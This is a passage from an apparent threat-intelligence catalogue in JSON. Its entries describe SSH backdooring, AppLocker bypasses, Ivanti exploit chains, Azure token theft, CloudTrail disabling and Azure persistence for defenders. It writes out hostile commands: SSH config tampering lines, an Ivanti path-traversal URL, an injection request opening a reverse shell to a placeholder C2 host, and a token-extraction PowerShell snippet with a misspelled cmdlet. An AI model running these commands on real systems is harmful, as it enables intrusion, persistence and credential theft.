SSH on a high or less-monitored port:\n\n```bash\nsed -i 's/^Port 22/Port 2222/' /etc/ssh/sshd_config\n```\nThis tactic helps attackers blend into legitimate traffic patterns or bypass \nperimeter defenses that only monitor the default SSH port.  \n\n### Creating Hidden Backdoors\nAttackers may add an additional Match block in sshd_config that grants special \nprivileges to a specific user or from a specific IP range:\n\n```bash\necho \"Match User hiddenuser    X11Forwarding yes    AllowTcpForwarding yes\" >> /etc/ssh/sshd_config\n```\nThis configuration could stealthily enable features like port forwarding, \nfurther helping attackers evade detection and maintain persistence.  \n"
            },
            "4a4a7c81-ca98-4761-8f23-7ef6354e9d1c": {
                "name": "Android attack using app running on emulator",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The threat vector involves exploiting emulated environments to bypass security measures, \nautomate malicious activities, and manipulate app behavior. Below are key aspects \nof this threat:\n\n## How the Attack Works\n1. **Exploitation of Emulators**:  - Android emulators like NoxPlayer, BlueStacks, or custom emulator farms are   used by attackers to mimic legitimate devices and bypass app security mechanisms.  - Emulators provide attackers with a controlled environment to test and refine   their techniques before deploying them at scale.\n\n2. **Fraudulent Activities**:  - **Spoofing Device Identifiers**: Attackers use emulators to replicate legitimate   device identifiers (e.g., IMEI, OS version) obtained through malware or phishing   attacks, making fraudulent transactions appear genuine.  - **Automation**: Scripts and automation frameworks enable large-scale fraud,   such as creating fake accounts, performing unauthorized transactions, or bypassing   authentication systems.  - **Data Manipulation**: Emulators allow attackers to intercept and modify app   data or API calls for malicious purposes.\n\n3. **Advanced Techniques**:  - **Runtime Hooks**: Tools like Frida are used to hook into app functions dynamically,   altering system properties (e.g., `ro.kernel.qemu`) to make the emulator appear   as a physical device.  - **Customized Emulator Farms**: Organized groups deploy emulator farms with   dozens of emulators to cycle through spoofed devices rapidly, avoiding detection   and maximizing fraud efficiency.\n\n## Common Attack Scenarios\n- **Financial Fraud**: Emulator farms have been used to steal millions from banks \nby automating fraudulent transactions while evading detection systems.\n- **API Abuse**: Attackers reverse-engineer apps running on emulators to exploit \nAPIs for unauthorized access or data theft.\n- **App Tampering**: Emulators facilitate code injection or reverse engineering \nto modify app functionality and compromise security features.\n\n## Key Components Used in These Attacks\n- Access to compromised credentials (usernames/passwords) and device identifiers.\n- Custom scripts for network interception and API manipulation.\n- Cycling of spoofed devices to evade detection and maintain operational stealth.\n"
            },
            "f8876b38-ed54-495f-bd40-758211b9d6ee": {
                "name": "Apple WebKit exploited for arbitrary code execution",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "WebKit is a cross-platform browser rendering engine used in Safari\nand other applications across macOS, iOS, and other platforms.\n\nDue to Apple's restrictions, even Chromium-based browsers on iOS,\nsuch as Google Chrome and Microsoft Edge, rely on WebKit, making\nthem vulnerable to this exploit as well. According to Apple,\nthis issue may have been exploited against specific targeted\nindividuals on versions of iOS before iOS 17.23 ref [2].    \n\nThe WebKit vulnerability (CVE-2025-24201) is an out-of-bounds write \nvulnerability and Apple notes it as a zero-day exploited remotely. \nIt allows attackers to bypass WebKit's sandbox and achieve arbitrary \ncode execution on affected devices. The vulnerability requires user\ninteraction in order to be triggered. For more details ref [6].        \n\nThe vulnerability requires user interaction in order to be triggered.\nFrom the analysis and the information in the reports what is known until\nnow is that the exploit code is not publicly available and the Webkit\ncomponent presents in software used by multiple Union entities.   \n\nFrom the available information until now, the known affected\nproducts are chromium-based browsers on the following platforms: \nmacOS, iOS, iPadOS ref [1], [2].  \n\nApple is also known for emailing affected users, despite the \nlimited amount of information on the Threat Alert, as confirmed by \nCERT-EU, in case of exploitation detected by Apple notification \nwill be sent.    \n"
            },
            "a73c2506-8584-4c0b-bfdc-52e33c8bd229": {
                "name": "AppLocker bypass using DLLs",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "AppLocker bypass using DLLs involves exploiting the way Windows loads DLLs\ninto processes. An attacker can create a malicious DLL that mimics a\nlegitimate one, which is allowed to run by AppLocker. When a legitimate\napplication loads the malicious DLL, it can execute arbitrary code,\neffectively bypassing AppLocker restrictions.\n\nA threat actor can bypass AppLocker application whitelisting using DLL\nlibraries. The reason is that there is no a mechanism for blocking out some\nof the default DLLs. \n\nAdditionally, DLLs are not executed directly by the operating system;\ninstead, they are loaded into the memory space of a process. This makes\nit challenging for AppLocker to detect and block malicious DLLs activities.\n\nThere are several techniques that can be used to bypass AppLocker\nusing DLLs:\n\n- DLL Hijacking - a threat actor can create a malicious DLL with the same  name as a legitimate DLL that is already allowed by AppLocker. When the  legitimate application loads the DLL, it will load the malicious one  instead, allowing the attacker to execute arbitrary code.\n- DLL Preloading - a threat actor can create a malicious DLL that is loaded  before the legitimate DLL. This can be done by placing the malicious DLL in  a directory that is searched before the directory containing the legitimate  DLL.\n- DLL Side-Loading: An attacker can create a malicious DLL that is loaded by  a legitimate application that is allowed by AppLocker. The malicious DLL can  then execute arbitrary code.\n\n### DLL hijacking mimics a legitimate DLL name in AppLocker\n\nAn attacker can create a malicious DLL with the same name as a legitimate\none, which is allowed to run by AppLocker. The malicious DLL is placed in a\ndirectory that is searched before the legitimate DLL's location.\n\n### Loading a malicious DLL\n\nWhen a legitimate application loads the malicious DLL, Windows will load the\nmalicious DLL instead of the legitimate one. This allows the attacker to\nexecute arbitrary code, bypassing AppLocker restrictions.\n\n### REGSRV32 binary can bypass AppLocker restrictions by executing malicious DLL\n\nRegsvr32.exe is a trusted Windows binary which can be used to bypass\nAppLocker restrictions by executing a malicious DLL (e.g., cmd.dll).\nSince regsvr32.exe is typically allowed by AppLocker policies and doesn't\nrely on cmd.exe or powershell.exe, it can be used to load and run arbitrary\ncode through exported functions like `DllRegisterServer`. This allows\nattackers to execute commands or scripts while avoiding detection and\nbypassing common application whitelisting controls ref [1].\n\n### An example of AppLocker bypass using DLLs\n\nAs an example to bypass Windows AppLocker a threat actor can create a\nmalicious DLL named `search.dll` and place it in the `C:\\Windows` directory.\nWhen the Windows Search service loads the `search.dll` DLL, it will load the\nmalicious one instead of the legitimate one.\n"
            },
            "ff8c52ac-77d0-4bee-9f6d-e40fc6e0da63": {
                "name": "AppLocker bypass using writable folders",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "AppLocker bypass using writable folders is a technique where an attacker\nexploits the fact that AppLocker only checks the executable file's path,\nnot the path of the folder containing the executable. By placing a malicious\nexecutable in a writable folder that is not restricted by AppLocker, an\nattacker can bypass AppLocker controls.  \n\nAppLocker uses a set of rules to determine which applications are allowed\nto run. These rules are based on factors like the application's path,\npublisher, and hash. If a threat actor can write to a folder that is allowed\nby AppLocker, they can potentially bypass the restrictions.  \n\n### Examples for AppLocker writable folders\n\nThe list below includes some of the folders in Windows where a standard user\nhave write permissions by default. These permissions can be used by threat\nactors and let them to bypass AppLocker Windows whitelisting functionality.\nFor more information please check ref [1], [2].  \n\n- `C:\\Windows\\Tasks` - Windows Tasks directory, writable by the \"Users\" group\n- `C:\\Windows\\Temp`  - Temporary Files\n- `C:\\Windows\\tracing`\n- `C:\\Windows\\Registration\\CRMLog`\n- `C:\\Windows\\System32\\FxsTmp`\n- `C:\\Windows\\System32\\com\\dmp`\n- `C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys`\n- `C:\\Windows\\System32\\spool\\PRINTERS`\n- `C:\\Windows\\System32\\spool\\SERVERS`\n- `C:\\Windows\\System32\\spool\\drivers\\color`\n- `C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter`\n- `C:\\Windows\\System32\\Tasks_Migrated`   (after peforming a version upgrade of Windows 10)\n- `C:\\Windows\\SysWOW64\\FxsTmp`\n- `C:\\Windows\\SysWOW64\\com\\dmp`\n- `C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter`\n- `C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System`\n\nAdditional ref [3], [4]:\n\n- `%APPDATA%`                        # Application Data / Roaming User Data\n- `%LOCALAPPDATA%`                   # Local Application Data / Local User Data\n- `%USERPROFILE%\\Desktop`            # User's Desktop): Desktop\n- `%USERPROFILE%\\AppData\\Local\\Temp` # Local Low, this is a subfolder of %LOCALAPPDATA%\n\n### Other possible writable folders in AppLocker\n\nThere are some other possible writable folders in `C:\\WINDOWS` where a\nstandard Windows user may have write permissions by default. For example,\n'accesschk.exe' from Sysinternals Suite can be used to find folders that\nare writable and can be leveraged. Furthermore, 'icacls.exe' can be used to\ndetermine if we also have execute rights within the targeted folder.\n\nDifferent threat actors are actively exploiting this AppLocker bypass\ntechnique to deploy malware, execute malicious code, and gain persistence\non compromised systems.\n\n### Example\n\nLenovo devices include a file, MFGSTAT.zip, in C:\\\\Windows that is writable\nby authenticated users. An attacker can embed a malicious payload into an\nNTFS alternate data stream within this ZIP file and invoke it via a signed\nWindows binary (e.g., AppVLP.exe), bypassing AppLocker rules.  \n"
            },
            "197c06c8-7959-4e28-9ede-b3e7b6f13442": {
                "name": "AppLocker bypass",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "### AppLocker rules types \n\nAppLocker can be found from within the Group Policy Management at _Local Computer Policy ->\nComputer Configuration -> Windows Settings -> Security Settings -> Application Control Policies_.\nFour rule types are available:  \n- Executable rules: enforces the rules for executable files (`.exe`).\n- Windows Installer rules: enforces the rules for windows installer files (`.msi`).\n- Script rules: enforces the rules for PowerShell, JScript, VB and older file formats (`.cmd`, `.bat`).\n- Package app rules: enforces the rules for packages that can be installed through Microsoft Store.\n\n### Enumerating AppLocker policies\n\nAppLocker policies can be enumerated using the registry query functionality, as show below:\n`reg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\SrpV2\\`\n\n## Several strategies are available:\n\n\n### Bypassing leveraging trusted folders\n\nThere are several writable folders within `C:\\WINDOWS` where standard users have write permissions by default.\n`accesschk.exe` from Sysinternals Suite can be used to find folders that are writable and can be leveraged.\nFurthermore, `icacls.exe` can be used to determine if we also have execute rights within the targeted folder.\nBy moving a binaryfile (for example) to the folder with execute rights, it is possible to execute the binary.\n\n### Bypassing using DLLs\n\nFrom the initial setup there was no option of blocking out DLLs by default, resulting in another way of bypassing\nthe application whitelisting. Note that AppLocker configuration can be further tweaked to restrict the usage of\nDLLs by enabling DLL rule collection from within the AppLocker properties.\n\n### Bypassing using Alternate Data Stream\n\nAnother method to bypass AppLocker involves embedding an executable into another file, known as an \nalternate data stream (ADS), and then executing the EXE from the ADS. AppLocker rules do not prevent executables\nfrom running within an ADS.\n\n### Bypassing using third parties\n\nThird party tools or software can be used to bypass the AppLocker policy. However, this is conditional, as it\nrequires the system to have installed these tools on it. An example would be using Python or Perl.\n"
            },
            "9a1aeae5-912e-492c-b5d4-8bce91a95dae": {
                "name": "AppLocker enumerating policy bypass",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Enumerating policy bypass in AppLocker refers to the process of identifying\nand exploiting weaknesses or vulnerabilities in AppLocker policies to run\nunauthorised applications.    \n\nA threat actor can use various methods and tools to enumerate AppLocker\npolicies with the goal to find weaknesses in this protection mechanism and\nto exploit its whitelisting. Some of them are listed below.\n\n### Bypass AppLocker policies\n\n- Renaming executables method - renaming malicious executables to match the\nname of an allowed application. In this way a threat actor can hide their\nreal malicious executables and intend in order to bypass AppLocker policies. \n- Using alternative executable extensions - using alternative executable\nextensions, such as .scr or .pif, to bypass AppLocker rules.\n- Enumeration of AppLocker policies tools - a threat actor can use different\nenumeration tools to check if AppLocker policies are on place and what they\nare blocking.\n\n### Enumerating AppLocker policies\n\nAppLocker policies can be enumerated using the registry query functionality,\nas show below ref [5],[6]:  \n\n'reg query HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\SrpV2\\'\n\n### Known tools for AppLocker policy enumeration\n\nAppLocker is a Windows feature that allows administrators to control which\napplications can run on a device. Threat actors often try to bypass or\nenumerate AppLocker policies to execute malicious code.\n\n- PowerShell: PowerShell is a powerful tool that can be used to enumerate\nAppLocker policies. Threat actors can use PowerShell cmdlets like\n`Get-AppLockerPolicy` to retrieve AppLocker policies and\n`Test-AppLockerPolicy` to test whether a specific application is allowed\nto run.\n- AppLocker Bypass Tools: There are several tools available online that can\nbypass AppLocker policies. For example, the tool named `AppLockerBypass` is\na tool that uses various techniques to bypass AppLocker policies. Another\ntool used for this purpose is `BypassAppLocker`. This tool uses PowerShell\nto bypass AppLocker policies.\n- MSBuild: MSBuild is a legitimate Windows utility that can be used to build\nand execute code. Threat actors can use MSBuild to bypass AppLocker policies\nby executing malicious code.\n- Rundll32 : RunDLL is a legitimate Windows utility that can be used to execute\ndll. Threat actors can use RunDLL to bypass AppLocker policies.\n- Regasm/Regsvr32: Regasm and Regsvr32 are legitimate Windows utilities that\ncan be used to register and execute DLLs. Threat actors can use these tools\nto bypass AppLocker policies by executing malicious DLLs.\n- Certutil: Certutil is a legitimate Windows utility that can be used to\nmanage certificates. Threat actors can use Certutil to bypass AppLocker\npolicies by executing malicious code.\n- Wscript/Cscript: Wscript and Cscript are legitimate Windows utilities that\ncan be used to execute scripts. Threat actors can use these tools to bypass\nAppLocker policies by executing malicious scripts.\n- Invoke-AppLockerBypass: This is a PowerShell script that uses various\ntechniques to bypass AppLocker policies.\n- SharpAppLocker: This is a C# tool that can be used to bypass AppLocker\npolicies.\n- WinPEAS - WinPEAS is a powerful tool that can be used to audit and bypass\nWindows security features, including AppLocker policies. For more details\nrelated to WinPEAS Applocker enumeration usage check ref [2].  \n"
            },
            "810057c6-cb84-41e4-add4-ae56b52c8ab7": {
                "name": "authentication bypass on Ivanti Connect Secure appliances",
                "model": true,
                "tlp": "clear",
                "criticality": "Severe",
                "description": "### chained exploitation of CVE-2023-46805 or CVE-2024-21893 together with CVE-2024-21887.\n\nAttackers may chain exploits on vulnerabilities CVE-2023-46805 and \nCVE-2024-21893 on Ivanti Connect Secure (ICS) appliances (that provide \nremote VPN access to corporate infrastructures) to fully compromise the \nvulnerale appliance.  \n\nThe code on the appliance checks whether access to the requested uri_path \nrequires authentication or not. For endpoint `/api/v1/totp/user-backup-code` \nthe check is done only on the start of the string.  \n\nSo an attacker can append additional characters that are passed to the \nwebserver without additional checks. Using path traversal technique, it is \nthen possible to access API endpoints that would require authentication \nwhen accessed directly. For example, successful request to \n`/api/v1/totp/user-backup-code/../../system/system-information` will return\nthe system information.  \n\nCVE-2023-46805 allows then to access any other uri_path without \nauthentication and enables exploitation of CVE-2024-21887.\n\nLater it was reported that initial mitigations for CVE-2023-46805 could be \nby passed by exploiting CVE-2024-21893 to bypass authentication and \nenabling CVE-2024-21887 without using vulnerable uri paths or to drop \ncustom webshells ([BUSHWALK](https://advantage.mandiant.com/malware/malware--96732cf0-d99a-501b-9646-c49f2b30dd5a) \n[LIGHTWIRE](https://advantage.mandiant.com/malware/malware--089bf6cc-9b67-5bd5-8fd3-3330e7cedf7e) \n[CHAINLINE](https://advantage.mandiant.com/malware/malware--4a3560fd-5ec5-5581-a8f7-1c888d28186b) \nand others have been observed.  \n\nExploitation of the SSRF generates up to 2 log events:\n- AUT31556 on `/dana-ws/saml.ws`\n- ERR31093: Program saml-server recently failed. \n\nLikewise, exploition of CVE-2024-21893 or CVE-2024-22024 enables \nexploitation of CVE-2024-21887.\n\n### Other TTPs\n\n- *Configuration and data theft* Exfiltration of configuration or cache \ndata either in the response to the request (so on apparently legit activity)\nor by replacing or creating a new file under unauthenticated uri path.\n- CAV Web Server Log Exfiltration \n- Internal Check tool tampering\n- System log clearing: In some instances, logs have been cleared using the legitimate system \nutility therefore generating event ID ADM20599.\n"
            },
            "b2ce7db4-253f-4286-9b38-a1a7b60af49e": {
                "name": "Authentication bypass vulnerability in Ivanti EPMM",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Ivanti EPMM - formerly known as MobileIron - is a Mobile Device\nManagement solution (MDM) used to centrally manage corporate and\nprivate mobile phones across an organisation ref [1].  \n\nA threat actor exploit a zero-day vulnerability in Ivanti EPMM\nsystem. In one of the threat actor campaigns was observed that\nthe threat actor used even a second zero-day exploit chained to\nthe fist one.  \n\nThe vulnerabilities could allow an attacker to bypass\nauthentication mechanisms and gain unauthorised access\nto the system. \n\nThe first used vulnerability is related to the handling of\nauthentication tokens. An attacker can exploit this vulnerability\nby sending a crafted request to the `/api/v1/auth` endpoint.\nThis flaw can be exploited without any prior authentication or\nauthorisation ref [3].  \n\n### Vulnerabilities in Ivanti EPMM exploitation\n\n- CVE-2025-4427: A vulnerability in the `/api/v1/auth` endpoint,\nwhich allows an attacker to bypass authentication by sending\na crafted request with a malicious expression payload ref [3].\n- CVE-2025-4428: A vulnerability in the `/api/v1/users` endpoint,\nwhich allows an attacker to bypass authentication and gain access\nto sensitive user information by sending a crafted request with\na malicious expression payload ref [3].\n\nBased on the provided information from the reports and analysis\nthere are several steps how a threat actor might exploit an\nauthentication bypass vulnerability in Ivanti EPMM:\n\n1. Identify the vulnerable endpoint - the threat actor identifies\na vulnerable endpoint, such as `/api/v1/auth` or `/api/v1/users`,\nwhich is susceptible to authentication bypass attacks.\n2. Craft a malicious request - a threat actor crafts a malicious\nrequest with a specially designed payload, which can be an expression\npayload or a crafted authentication token.\n\nA request such as :\n  ```powershell  /mifs/rs/api/v2/featureusage?format=${''  .getClass().forName('java.lang.Runtime')  .getMethod('getRuntime').invoke(null)  .exec('sh -i >& /dev/tcp/C2.IP.Add.ress/8080 0>&1').waitFor()}  ```\nreaches the vulnerable validator before authentication, spawning a\nreverse shell.\n3. Send the malicious request - threat actor sends the malicious\nrequest to the vulnerable endpoint, which can bypass the authentication\nmechanism and grant access to the system.\n4. Gain unauthorised access - in the end as a final step a threat\nactor gains unauthorised access to the system, which can lead to\nfurther malicious activities, such as data breaches, lateral\nmovement, or system compromise ref [4].  \n"
            },
            "841e2a63-c95f-43f8-aef0-7ab96456445a": {
                "name": "Automation accounts JWT extraction",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The threat vector refers to attacks where attackers exploit Azure Automation Accounts \nto steal JSON Web Tokens (JWTs) associated with Managed Identities, enabling privilege \nescalation and lateral movement in cloud environments. Here's a detailed breakdown:\n\n## Attack Methodology\n**JWT Extraction via Runbook Modification**  \nAttackers modify Automation Account runbooks to execute PowerShell scripts that \naccess the Managed Identity endpoint:  \n```powershell\n$tokenAuthURI = $env:MSI_ENDPOINT + \"?resource=https://graph.microsoft.com/&api-version=2017-09-01\"\n$tokenResponse = Invive-RestMethod -Method Get -Headers @{\"Secret\"=\"$env:MSI_SECRET\"} -Uri $tokenAuthURI\n$tokenResponse.access_token\n```\nThis script retrieves a JWT for the Automation Account's Service Principal, which \nattackers then exfiltrate.\n\n## Abuse Potential\n- **Privilege Escalation**: Stolen JWTs grant the same permissions as the Automation \nAccount's Managed Identity, enabling access to Azure Graph API, Key Vaults, and \nother services.\n- **Token Replay**: Attackers use extracted JWTs to authenticate as the Service \nPrincipal outside Azure Automation's context.\n- **Algorithm Confusion**: Weak JWT validation could allow attackers to modify token \nclaims while maintaining valid signatures (e.g., switching from RS256 to HS256).\n\n## Tooling\n- **JWTXposer**: Scans archives for leaked JWTs and analyzes claims for privilege \nescalation opportunities.\n- **jwt_tool**: Performs dictionary attacks against JWT secrets and exploits algorithm \nconfusion vulnerabilities.\n- **Azure APIs**: Native tools like Az PowerShell modules can abuse valid JWTs for \nresource enumeration.\n"
            },
            "1040ebd2-4659-4844-9238-95fa69a7e63c": {
                "name": "AWS Compute instance deployed in unusual region",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Certain threat actors will try to launch AWS compute instances \n(EC2, EKS, ECS) instances to achieve their objectives\n\nOne of the main vectors currently is to monetize access to \nprivileged AWS credentials by deploying new compute instances of various types \nto mine cryptocurrencies. To hide their deployed instances, a threat actor \nmay deploying the resources into unused regions, where they may go \nunnoticed.\n\nAdditionally threat actor may launch compute instances to act as staging \nplatforms for serving malware for other campaigns.\n\nIt is expected that threat actors will potentially use compute instances \nfor other purposes than the 2 listed above.\n"
            },
            "d370aaea-c3e5-4d58-a6c9-3d1a7ffe50e3": {
                "name": "AWS Stop Logging CloudTrail",
                "model": true,
                "tlp": "clear",
                "criticality": "Low",
                "description": "### AWS Stop Logging CloudTrail Threat\n\nThe \"AWS Stop Logging CloudTrail\" threat is a malicious action where an attacker \ndeliberately disables AWS CloudTrail logging. This intentional act poses a significant \nrisk to AWS users, and understanding its nature, purpose, and implications is crucial \nfor maintaining and protecting CloudTrail logs.\n\n### Nature of the Threat\n\n1. **Definition**: It's an intentional act to stop AWS CloudTrail from recording \nAPI activity and events within an AWS account.\n2. **Method**: The attacker uses the AWS API, specifically the `StopLogging` operation \non a CloudTrail trail.\n3. **Target**: The primary target is the CloudTrail service, which is responsible \nfor logging and monitoring AWS account activity.\n\n### Purpose and Motivation\n\n1. **Evasion**: The main goal is to evade detection by stopping the recording of \nactions taken in the AWS environment.\n2. **Concealment**: Attackers aim to hide their tracks and prevent their activities \nfrom being logged.\n3. **Persistence**: By disabling logging, attackers can maintain access and perform \nactions without leaving a trail.\n\n### Potential Impact\n\n1. **Loss of Audit Trail**: Critical information about API calls and account activity \nis no longer recorded.\n2. **Compliance Violations**: Many regulatory standards require continuous logging, \nwhich this threat violates.\n3. **Increased Vulnerability**: Without logs, identifying and responding to other \nsecurity incidents becomes significantly harder.\n4. **Extended Attacker Freedom**: Attackers can perform various malicious activities \nwithout fear of being logged.\n5. **Data Loss**: Any actions performed while logging is disabled are permanently \nlost and cannot be retroactively captured.\n\n### Broader Implications\n\n1. **Part of Larger Attacks**: This action is often part of a more extensive attack \nstrategy, potentially indicating a sophisticated adversary.\n2. **Indicator of Compromise**: The act of stopping CloudTrail logging is itself \na strong indicator that an account has been compromised.\n3. **Time-Sensitive Impact**: Every moment CloudTrail logging remains disabled increases \nthe potential damage and loss of critical audit information.\n\n### Identifying the Threat\n\nStopLogging is a critical action that adversaries may use to evade detection. By \nhalting the logging of their malicious activities, attackers aim to operate undetected \nwithin a compromised AWS environment. Identifying such behavior is important, as \nit signals an attempt to undermine the integrity of logging mechanisms, potentially \nallowing malicious activities to proceed without observation. The impact of this \nevasion tactic is significant, as it can severely hamper incident response and forensic \ninvestigations by obscuring the attacker's actions.\n"
            },
            "5d43ef75-4637-4a75-b1ed-6716052cff0e": {
                "name": "Azure - App registration persistence",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Azure app registration persistence is a technique where adversaries exploit Azure \nActive Directory (Azure AD) app registration and OAuth application features to maintain \nlong-term, often covert, access to a cloud environment. This threat vector is increasingly \ntargeted due to the power and longevity of permissions granted to registered applications, \nand the often-overlooked persistence such registrations can provide\u2014even after the \noriginal user or use case is no longer present.\n\n## How the Threat Works\n\n- **App Registration**: In Azure AD, app registration allows third-party or custom \napplications to integrate with Microsoft 365 or Azure resources. These apps can \nbe granted permissions\u2014sometimes highly privileged\u2014to access data, send emails, \nor even manage resources.\n- **Persistence Mechanism**: Once an app is registered and consented to (either by a user or administrator), \nit can retain its permissions indefinitely, unless specifically revoked. Attackers \nexploit this by registering their own applications or adding malicious credentials \nto existing ones, ensuring continued access even if user passwords are reset or \naccounts are disabled.\n- **Credential Abuse**: Attackers can add new secrets or certificates to an app \nregistration (service principal), allowing them to authenticate as the app without \nneeding to compromise user credentials again.\n\n## Attack Scenarios\n\n- **Compromising a User or Admin Account**: Attackers first compromise a user or \nadministrator account, often via phishing, password spraying, or MFA fatigue attacks.\n- **Registering or Manipulating an App**: With access, they either register a new \nOAuth application or add credentials to an existing one. They may grant the app \nexcessive permissions, such as the ability to read emails, access files, or manage \nresources.\n- **Maintaining Access**: Even if the original compromised account is remediated, \nthe attacker\u2019s app can continue to operate using its own credentials, providing \na persistent backdoor into the environment.\n- **Abuse Examples**:  - Deploying resources (e.g., virtual machines for cryptomining) and incurring   significant costs for the victim.  - Exfiltrating sensitive data from SharePoint, OneDrive, or mailboxes.  - Launching internal phishing or malware campaigns using the victim\u2019s cloud infrastructure.\n\n## Real-World Examples\n\n- **Storm-1283 Campaign**: Microsoft observed threat actors using compromised accounts \nto register OAuth apps, grant them Contributor roles, and deploy virtual machines \nfor cryptomining. The attackers added secrets to both new and existing applications, \nmaintaining access and causing substantial financial damage.\n- **Supply Chain Attacks**: Attackers with administrator access to a publisher tenant \ncan add malicious credentials to legitimate multi-tenant applications, enabling \nunauthorised access to customer environments even if the original administrator \nis removed.\n- **Internal Phishing**: Attackers have registered apps to upload and share malicious \nfiles internally, leveraging default consent settings to spread laterally within \norganisations.\n"
            },
            "2c6058fb-21db-47fe-99bc-a07cb70c53e4": {
                "name": "Azure - Backup Delete",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The following threat vector involves adversaries deleting backup data from Recovery \nServices Vaults, potentially crippling recovery efforts after a compromise. \n\n## Example Attack Scenario\nAdversaries enumerates available Recovery Services Vaults, discover active backup \nitems (e.g., VMs, databases), and execute a \"Stop Protection and Delete Backup Data\" \noperation. If soft delete is not enabled, or the feature is disabled (potentially \nby compromising Resource Guard or Multi-User Authorization controls), all backup \ndata is permanently deleted, leaving no recourse for recovery. In more advanced \nattacks, the attacker may seek to disable soft delete or reduce retention windows \nbefore initiating full backup deletion to maximize the impact.\n\n## Attack Goals and Impact\n- **Goals:** The primary goal is to **destroy backup copies** so that critical systems \nand data cannot be restored after ransomware encryption, destructive attacks, or \nother forms of compromise.\n- The attacker may use this method to put added pressure in ransomware attempts, \nmaking recovery impossible unless a ransom is paid.\n- Organizations are left without operational recovery points, leading to prolonged \noutages, potential data loss, financial impact, and reputational harm.\n- Disabling \"soft delete\" or tampering with backup retention extends the risk, as \nit eliminates the safety buffer against accidental or malicious deletion.\n\n## Attack Flow and Methodology\n\n1. List all Recovery Services Vaults and enumerate protected items (VMs, SQL databases, \nfile shares, etc.) in the Azure environment.\n2. Elevate privileges if needed to gain backup operator or owner roles, sometimes \nby disabling RBAC/MFA controls.\n3. - Attempt to disable or reduce protection features such as \"Soft Delete\" or retention   policies\u2014sometimes by also compromising Resource Guard if Multi-User Authorization   is used.  - Review or manipulate policies to enable immediate deletion.\n4. - Execute \"Stop Protection and Delete Backup Data\" commands via the Azure portal, \nCLI, PowerShell, REST API, or through automation scripts.  - If soft delete is active, data only moves into a soft-delete state (usually   14 days retention) and can be restored within that time.\n5. Attempt to remove items from even the soft-delete state if possible. Some attacks \ntarget disabling soft delete (if accessible); after the retention period, deleted \ndata is permanently lost.\n6. All recovery points are lost, blocking simple system and data restores and maximizing \nthe attack impact. The victim organization must resort to slower, less effective, \nor non-existent recovery measures.\n"
            },
            "10a89280-d42e-446d-9f8d-840b1218f532": {
                "name": "Azure - Elevated Access Toggle",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "## Example Attack Scenario\n\nOnce inside, the attacker enables the **\"Access management for Azure resources\"** \ntoggle in Entra ID properties. This action assigns the attacker the *User Access \nAdministrator* role at the **root scope**, granting them permission to manage RBAC \n(Role-Based Access Control) assignments for every subscription and management group \nin the tenant. The attacker uses these elevated rights to create a new user and \nassigns it the *Owner* role at root, establishing durable persistence and full-control \naccess throughout Azure resources.\n\n## Attack Goals and Impact\n\nThe primary goal for adversaries is to escalate their privileges from Azure AD into \nall Azure subscriptions within the tenant. Impact includes:\n- **Total control:** Complete administration of every Azure resource, service, management \ngroup, and subscription\u2014akin to \u201cGod-mode\u201d access.\n- **Persistence:** Ability to create backdoor accounts or roles that will survive \nremediation attempts if defenders only remove the initially compromised account.\n- **Disruption or exfiltration:** Attackers can shut down services, delete resources, \nsteal sensitive data, or create new destructive attack paths.\n\n## Attack Flow and Methodology\n\n1. **Elevated Access Activation**  - In the Entra ID portal, the adversary enables \u201cAccess management for Azure resources.\u201d   This assigns the User Access Administrator role to their account at the Azure   *root scope* (`/`), above all subscriptions and management groups.\n2. **Privilege Escalation and Persistence**  - With root scope RBAC control, the attacker can grant themselves (or secondary   shadow accounts) *Owner* or similarly privileged roles across any and all Azure resources.\n3. **Attack Expansion**  - The attacker now has unrestricted access to create, modify, or delete resources   (VMs, networks, storage, etc.), read sensitive data, and assign permissions to   malicious applications for further exploitation.  - May use automation (PowerShell, Azure CLI) for rapid propagation.\n4. **Detection Evasion**  - The activity of toggling Elevated Access is logged in the Directory Activity   log (AuditLogs), but is not always integrated with standard subscription or management   group logs, making it harder to detect through routine monitoring.\n"
            },
            "31e7f292-8370-4255-861d-edd68ed8b7b0": {
                "name": "Azure - External Entity Access",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The following threat vector refers to a set of persistence techniques where an adversary \nconfigures a target Azure tenant to be managed or accessed by external entities, \nsuch as another tenant, external users, or identity providers. This section provides \nin-depth coverage of this threat vector according to the Azure Threat Research Matrix, \naddressing scenario, goals, impact, and methodology.\n\n### Example Attack Scenario\n\nAn attacker gains Global Administrator privileges in a compromised tenant and uses Azure \nLighthouse to register an external, attacker-controlled tenant as a delegated administrator. \nThis allows the attacker to manage resources and maintain persistence even if their \ninitial account is detected and removed. Alternatively, the attacker might use Microsoft \nPartner Delegated Administrative Privileges, transfer a subscription (\u201csubscription hijack\u201d), \nor add a new federated domain or identity provider, creating hidden backdoors for \nfuture access.\n\n- For example, after compromising credentials, an attacker uses Microsoft Graph \nAPI to modify tenant settings and register their own tenant as a manager via Azure Lighthouse.\n- The administrator in the compromised tenant is unaware as delegated permissions \nsilently persist, giving the attacker full control over resources and users.\n- Even after password resets or removal of individual malicious accounts, the external \nentity persists via configuration and cannot be easily detected without deep audit \nreview of resource assignments and domain trusts.\n\n### Attack Goals and Impact\n\nThe main goal is to establish persistence inside the target Azure environment through \nexternal entity control.\n\n- Maintain long-term, resilient access to cloud resources, regardless of changes \nin local credentials or account clean-ups.\n- 